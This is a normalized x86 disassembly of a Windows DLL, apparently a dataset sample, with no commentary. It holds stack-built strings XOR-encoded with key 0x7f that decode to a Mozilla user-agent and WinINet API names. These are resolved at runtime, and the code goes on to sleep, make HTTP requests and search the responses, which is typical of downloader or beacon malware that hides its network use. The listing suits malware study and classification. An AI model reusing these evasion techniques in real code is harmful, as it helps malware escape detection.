and [ ebp - 0x20 ] 0x0
retn
push ebx
call [ free@IAT ]
pop ecx
and [ ebp - 0x2c ] 0x0
sub_100028d6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x38 ] 0x32
mov [ ebp - 0x37 ] 0x10
mov [ ebp - 0x36 ] 0x5
mov [ ebp - 0x35 ] 0x16
mov [ ebp - 0x34 ] 0x13
mov [ ebp - 0x33 ] 0x13
mov [ ebp - 0x32 ] 0x1e
mov [ ebp - 0x31 ] 0x50
mov [ ebp - 0x30 ] 0x4b
mov [ ebp - 0x2f ] 0x51
mov [ ebp - 0x2e ] 0x4f
mov [ ebp - 0x2d ] 0x5f
mov [ ebp - 0x2c ] 0x57
mov [ ebp - 0x2b ] 0x1c
mov [ ebp - 0x2a ] 0x10
mov [ ebp - 0x29 ] 0x12
mov [ ebp - 0x28 ] 0xf
mov [ ebp - 0x27 ] 0x1e
mov [ ebp - 0x26 ] 0xb
mov [ ebp - 0x25 ] 0x16
mov [ ebp - 0x24 ] 0x1d
mov [ ebp - 0x23 ] 0x13
mov [ ebp - 0x22 ] 0x1a
mov [ ebp - 0x21 ] 0x44
mov [ ebp - 0x20 ] 0x56
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x4 ] ebx
push 0x1
pop edi
mov [ ebp - 0x4 ] edi
call sub_10002f79
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
imul eax eax 0x3e8
mov [ ebp - 0x90 ] eax
push eax
mov esi [ Sleep@IAT ]
call esi
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x80 ] ebx
push edi
push rw-data
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x8 ]
call sub_1000420e
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a6
jmp r-xdata
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x88 ] bl
mov edi rw-data
mov [ ebp - 0x50 ] 0xffffe4a7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002c5d
jmp r-xdata
inc [ ebp - 0x6c ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x38 ]
push eax
call [ rw-data ]
mov [ ebp - 0x58 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push 0x3
push edi
push edi
push 0x50
push [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x54 ] eax
cmp eax ebx
jne r-xdata
call sub_100041e6
push eax
call esi
mov [ ebp - 0x50 ] 0xffffe4a4
jmp r-xdata
push ebx
push 0x4000000
push ebx
push ebx
push rw-data
push [ ebp - 0x44 ]
push rw-data
push eax
call [ rw-data ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push eax
call [ rw-data ]
mov [ ebp - 0x98 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_100041e6
push eax
call esi
jmp r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x68 ] ebx
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x40 ]
call sub_10003417
add esp 0xc
mov [ ebp - 0x64 ] eax
cmp eax ebx
jg r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xa0 ] eax
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
push ebx
call sub_10007578
mov eax [ ebp - 0x6c ]
cmp eax [ ebp + 0x18 ]
jb r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a3
jmp r-xdata
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
lea ecx [ ebp - 0x84 ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
push [ ebp - 0x68 ]
push eax
call sub_1000359e
add esp 0x18
test eax eax
jne r-xdata
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x94 ] ebx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] ebx
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x94 ]
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
push eax
push [ ebp - 0x58 ]
call sub_1000376d
add esp 0x24
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x78 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a2
jmp r-xdata
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x94 ]
push [ ebp - 0x7c ]
push [ ebp + 0x1c ]
push [ ebp - 0x84 ]
push eax
push [ ebp - 0x58 ]
call sub_10003edb
add esp 0x18
mov [ ebp - 0x8c ] eax
sub_10002c5d
cmp [ ebp - 0x44 ] ebx
je r-xdata
mov esi [ free@IAT ]
push [ ebp - 0x44 ]
mov esi [ free@IAT ]
call esi
pop ecx
mov [ ebp - 0x44 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x5c ]
call esi
pop ecx
mov [ ebp - 0x5c ] ebx
cmp [ ebp - 0x5c ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
push [ ebp - 0x1c ]
call esi
pop ecx
mov [ ebp - 0x1c ] ebx
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x3c ]
call esi
pop ecx
mov [ ebp - 0x3c ] ebx
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
call sub_10002f61
retn
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
sub_10002d02
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x3c ] 0x32
mov [ ebp - 0x3b ] 0x10
mov [ ebp - 0x3a ] 0x5
mov [ ebp - 0x39 ] 0x16
mov [ ebp - 0x38 ] 0x13
mov [ ebp - 0x37 ] 0x13
mov [ ebp - 0x36 ] 0x1e
mov [ ebp - 0x35 ] 0x50
mov [ ebp - 0x34 ] 0x4b
mov [ ebp - 0x33 ] 0x51
mov [ ebp - 0x32 ] 0x4f
mov [ ebp - 0x31 ] 0x5f
mov [ ebp - 0x30 ] 0x57
mov [ ebp - 0x2f ] 0x1c
mov [ ebp - 0x2e ] 0x10
mov [ ebp - 0x2d ] 0x12
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x2b ] 0x1e
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0x16
mov [ ebp - 0x28 ] 0x1d
mov [ ebp - 0x27 ] 0x13
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0x44
mov [ ebp - 0x24 ] 0x56
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x20 ] 0x40
mov [ ebp - 0x1f ] 0x5a
mov [ ebp - 0x1e ] 0x5a
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x20 ]
push eax
call sub_100075ee
pop ecx
pop ecx
call sub_10002f79
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d360
mov [ ebp - 0x5c ] eax
mov ecx [ ebp + 0xc ]
lea esi [ eax + ecx ]
mov [ ebp - 0x48 ] esi
lea eax [ esi + 0x1 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
mov [ ebp - 0x40 ] 0xffffe4a6
jmp r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push edi
call sub_1000d316
mov [ ebp - 0x40 ] 0xffffe4a1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002f24
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10002e1a
push esi
push [ ebp + 0x8 ]
push edi
call [ strncpy@IAT ]
push edi
call sub_1000d360
sub esi eax
push esi
lea eax [ ebp - 0x20 ]
push eax
push edi
call [ strncat@IAT ]
add esp 0x28
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ rw-data ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
push esi
push edi
push eax
call sub_1000376d
add esp 0x24
mov [ ebp - 0x40 ] eax
cmp eax ebx
jge r-xdata
mov [ ebp - 0x40 ] 0xffffe4a4
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002f24
jmp r-xdata
push ebx
call sub_10007578
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10002f79
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x84 ] 0x8
mov [ ebp - 0x83 ] 0x16
mov [ ebp - 0x82 ] 0x11
mov [ ebp - 0x81 ] 0x16
mov [ ebp - 0x80 ] 0x11
mov [ ebp - 0x7f ] 0x1a
mov [ ebp - 0x7e ] 0xb
mov [ ebp - 0x7d ] 0x51
mov [ ebp - 0x7c ] 0x1b
mov [ ebp - 0x7b ] 0x13
mov [ ebp - 0x7a ] 0x13
xor ebx ebx
mov [ ebp - 0x79 ] bl
mov [ ebp - 0xc0 ] 0x36
mov [ ebp - 0xbf ] 0x11
mov [ ebp - 0xbe ] 0xb
mov [ ebp - 0xbd ] 0x1a
mov [ ebp - 0xbc ] 0xd
mov [ ebp - 0xbb ] 0x11
mov [ ebp - 0xba ] 0x1a
mov [ ebp - 0xb9 ] 0xb
mov [ ebp - 0xb8 ] 0x3c
mov [ ebp - 0xb7 ] 0x10
mov [ ebp - 0xb6 ] 0x11
mov [ ebp - 0xb5 ] 0x11
mov [ ebp - 0xb4 ] 0x1a
mov [ ebp - 0xb3 ] 0x1c
mov [ ebp - 0xb2 ] 0xb
mov [ ebp - 0xb1 ] 0x3e
mov [ ebp - 0xb0 ] bl
mov [ ebp - 0x3c ] 0x36
mov [ ebp - 0x3b ] 0x11
mov [ ebp - 0x3a ] 0xb
mov [ ebp - 0x39 ] 0x1a
mov [ ebp - 0x38 ] 0xd
mov [ ebp - 0x37 ] 0x11
mov [ ebp - 0x36 ] 0x1a
mov [ ebp - 0x35 ] 0xb
mov [ ebp - 0x34 ] 0x30
mov [ ebp - 0x33 ] 0xf
mov [ ebp - 0x32 ] 0x1a
mov [ ebp - 0x31 ] 0x11
mov [ ebp - 0x30 ] 0x3e
mov [ ebp - 0x2f ] bl
mov [ ebp - 0xac ] 0x37
mov [ ebp - 0xab ] 0xb
mov [ ebp - 0xaa ] 0xb
mov [ ebp - 0xa9 ] 0xf
mov [ ebp - 0xa8 ] 0x30
mov [ ebp - 0xa7 ] 0xf
mov [ ebp - 0xa6 ] 0x1a
mov [ ebp - 0xa5 ] 0x11
mov [ ebp - 0xa4 ] 0x2d
mov [ ebp - 0xa3 ] 0x1a
mov [ ebp - 0xa2 ] 0xe
mov [ ebp - 0xa1 ] 0xa
mov [ ebp - 0xa0 ] 0x1a
mov [ ebp - 0x9f ] 0xc
mov [ ebp - 0x9e ] 0xb
mov [ ebp - 0x9d ] 0x3e
mov [ ebp - 0x9c ] bl
mov [ ebp - 0x64 ] 0x37
mov [ ebp - 0x63 ] 0xb
mov [ ebp - 0x62 ] 0xb
mov [ ebp - 0x61 ] 0xf
mov [ ebp - 0x60 ] 0x2c
mov [ ebp - 0x5f ] 0x1a
mov [ ebp - 0x5e ] 0x11
mov [ ebp - 0x5d ] 0x1b
mov [ ebp - 0x5c ] 0x2d
mov [ ebp - 0x5b ] 0x1a
mov [ ebp - 0x5a ] 0xe
mov [ ebp - 0x59 ] 0xa
mov [ ebp - 0x58 ] 0x1a
mov [ ebp - 0x57 ] 0xc
mov [ ebp - 0x56 ] 0xb
mov [ ebp - 0x55 ] 0x3e
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x2c ] 0x37
mov [ ebp - 0x2b ] 0xb
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0xf
mov [ ebp - 0x28 ] 0x2e
mov [ ebp - 0x27 ] 0xa
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0xd
mov [ ebp - 0x24 ] 0x6
mov [ ebp - 0x23 ] 0x36
mov [ ebp - 0x22 ] 0x11
mov [ ebp - 0x21 ] 0x19
mov [ ebp - 0x20 ] 0x10
mov [ ebp - 0x1f ] 0x3e
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x78 ] 0x36
mov [ ebp - 0x77 ] 0x11
mov [ ebp - 0x76 ] 0xb
mov [ ebp - 0x75 ] 0x1a
mov [ ebp - 0x74 ] 0xd
mov [ ebp - 0x73 ] 0x11
mov [ ebp - 0x72 ] 0x1a
mov [ ebp - 0x71 ] 0xb
mov [ ebp - 0x70 ] 0x3c
mov [ ebp - 0x6f ] 0x13
mov [ ebp - 0x6e ] 0x10
mov [ ebp - 0x6d ] 0xc
mov [ ebp - 0x6c ] 0x1a
mov [ ebp - 0x6b ] 0x37
mov [ ebp - 0x6a ] 0x1e
mov [ ebp - 0x69 ] 0x11
mov [ ebp - 0x68 ] 0x1b
mov [ ebp - 0x67 ] 0x13
mov [ ebp - 0x66 ] 0x1a
mov [ ebp - 0x65 ] bl
mov [ ebp - 0x98 ] 0x36
mov [ ebp - 0x97 ] 0x11
mov [ ebp - 0x96 ] 0xb
mov [ ebp - 0x95 ] 0x1a
mov [ ebp - 0x94 ] 0xd
mov [ ebp - 0x93 ] 0x11
mov [ ebp - 0x92 ] 0x1a
mov [ ebp - 0x91 ] 0xb
mov [ ebp - 0x90 ] 0x2d
mov [ ebp - 0x8f ] 0x1a
mov [ ebp - 0x8e ] 0x1e
mov [ ebp - 0x8d ] 0x1b
mov [ ebp - 0x8c ] 0x39
mov [ ebp - 0x8b ] 0x16
mov [ ebp - 0x8a ] 0x13
mov [ ebp - 0x89 ] 0x1a
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x50 ] 0x36
mov [ ebp - 0x4f ] 0x11
mov [ ebp - 0x4e ] 0xb
mov [ ebp - 0x4d ] 0x1a
mov [ ebp - 0x4c ] 0xd
mov [ ebp - 0x4b ] 0x11
mov [ ebp - 0x4a ] 0x1a
mov [ ebp - 0x49 ] 0xb
mov [ ebp - 0x48 ] 0x2c
mov [ ebp - 0x47 ] 0x1a
mov [ ebp - 0x46 ] 0xb
mov [ ebp - 0x45 ] 0x30
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x43 ] 0xb
mov [ ebp - 0x42 ] 0x16
mov [ ebp - 0x41 ] 0x10
mov [ ebp - 0x40 ] 0x11
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x84 ]
push eax
call sub_100075ee
pop ecx
lea eax [ ebp - 0x84 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0xac ]
push eax
call sub_100075ee
lea eax [ ebp - 0x64 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x78 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x98 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x50 ]
push eax
call sub_100075ee
add esp 0x20
lea eax [ ebp - 0xc0 ]
push eax
push [ rw-data ]
mov esi [ GetProcAddress@IAT ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x3c ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0xac ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x64 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x2c ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x78 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x98 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x50 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10006f75
sub_10003417
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x10 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_100034de
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp eax ebx
jle r-xdata
mov [ ebp - 0x4 ] ebx
call sub_100034a7
jmp r-xdata
mov [ esi ] eax
inc eax
push eax
call [ malloc@IAT ]
pop ecx
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp edi ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi ]
inc ecx
push ecx
push ebx
push eax
call sub_1000d316
mov [ esi ] ebx
jmp r-xdata
sub_100034de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] 0x4
push edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20000005
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
push eax
call [ malloc@IAT ]
pop ecx
mov esi [ ebp + 0xc ]
mov [ esi ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x1c ]
push edi
push eax
call sub_1000d316
sub_1000359e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1
pop eax
mov [ ebp - 0x20 ] eax
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] 0x17
mov [ ebp - 0x2f ] 0xb
mov [ ebp - 0x2e ] 0xb
mov [ ebp - 0x2d ] 0xf
mov [ ebp - 0x2c ] 0x45
mov [ ebp - 0x2b ] 0x50
mov [ ebp - 0x2a ] 0x50
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
lea esi [ eax + 0x1 ]
push esi
mov edi [ malloc@IAT ]
call edi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
push esi
push ebx
push eax
call sub_1000d316
mov [ ebp - 0x4 ] ebx
call sub_10003725
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000361d
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
mov esi [ strncpy@IAT ]
call esi
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x3c ] ebx
push ebx
push rw-data
lea ecx [ ebp - 0x3c ]
push ecx
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call sub_1000420e
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x1c ]
call [ strstr@IAT ]
add esp 0x38
mov [ ebp - 0x38 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x28 ]
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x38 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_1000d360
pop ecx
add [ ebp - 0x1c ] eax
push [ ebp - 0x1c ]
call sub_1000d360
mov [ ebp + 0x14 ] eax
inc eax
mov [ ebp - 0x40 ] eax
push eax
call edi
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_1000d360
pop ecx
add [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ebx
jmp r-xdata
push [ ebp - 0x40 ]
push ebx
push eax
call sub_1000d316
mov [ ebp - 0x4 ] ebx
call sub_10003725
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10003725
cmp [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x34 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x34 ] ebx
retn
push [ ebp - 0x24 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x24 ] ebx
sub_1000376d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] esi
push 0x1
pop ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] esi
push ebx
push rw-data
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0xc ]
call sub_1000420e
add esp 0x14
push esi
push esi
push 0x3
mov eax rw-data
push eax
push eax
push 0x50
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x40 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x44 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_100039bc
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe49a
jmp r-xdata
push esi
push 0x4000000
push esi
push esi
push rw-data
push [ ebp - 0x1c ]
push rw-data
push [ ebp - 0x34 ]
call [ rw-data ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe4a0
jmp r-xdata
mov [ ebp - 0x4 ] esi
call sub_1000392d
jmp r-xdata
push esi
push esi
push esi
push esi
push edi
call [ rw-data ]
mov [ ebp - 0x54 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe49f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x48 ] 0x4
mov [ ebp - 0x3c ] esi
push esi
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x20000013
push edi
call [ rw-data ]
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x58 ] esi
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push edi
call sub_100034de
add esp 0xc
mov [ ebp - 0x38 ] eax
cmp eax esi
jle r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x30 ] 0xffffe49e
jmp r-xdata
mov eax [ ebp + 0x28 ]
mov [ eax ] ebx
push [ ebp - 0x34 ]
call [ rw-data ]
mov [ ebp - 0x34 ] esi
push [ ebp - 0x20 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4c ] esi
push [ ebp + 0x24 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x58 ]
push [ ebp - 0x2c ]
call sub_10003a5b
add esp 0x14
mov [ ebp - 0x50 ] al
cmp al bl
jne r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x4c ]
push [ ebp - 0x28 ]
call sub_10003c04
sub_1000392d
cmp [ ebp - 0x1c ] esi
je r-xdata
mov edi [ free@IAT ]
push [ ebp - 0x1c ]
mov edi [ free@IAT ]
call edi
pop ecx
mov [ ebp - 0x1c ] esi
